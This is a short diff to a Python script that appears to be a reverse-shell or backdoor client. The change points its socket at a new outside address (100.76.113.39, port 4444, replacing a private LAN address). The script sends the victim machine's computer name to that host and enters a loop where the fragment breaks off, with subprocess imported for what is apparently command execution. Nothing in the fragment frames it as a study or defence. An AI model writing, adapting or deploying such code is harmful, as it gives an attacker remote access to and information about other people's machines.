@@ -3,7 +3,7 @@ import socket, os, subprocess
 os.system('cls')
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 port = 4444
-host = '192.168.7.2'
+host = '100.76.113.39'
 s.connect((host,port))
 s.send((os.environ['COMPUTERNAME']).encode('utf-8'))
 while 1:
